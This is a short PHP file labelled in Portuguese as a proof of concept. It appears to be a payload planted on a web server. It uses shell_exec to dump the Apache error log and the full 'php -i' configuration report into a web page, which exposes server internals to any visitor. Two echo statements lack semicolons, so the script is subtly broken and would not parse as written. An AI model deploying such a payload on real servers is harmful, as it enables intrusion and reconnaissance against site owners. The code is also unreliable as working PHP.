<?php
echo "<p> ===================================================================================================================<p>" ;
echo "<p> ============================================Prova de Conceito Comdono ============================================ <p>" ;
echo "<p> ===================================================================================================================<p>" ;



echo "<p>log de erros do apache <p>"
$output = shell_exec('cat /var/log/apache2/error.log');
echo "<pre>$output</pre>";




echo "<p> relatório das features do PHP <p>"

$output = shell_exec('php -i');
echo "<pre>$output</pre>";


?>
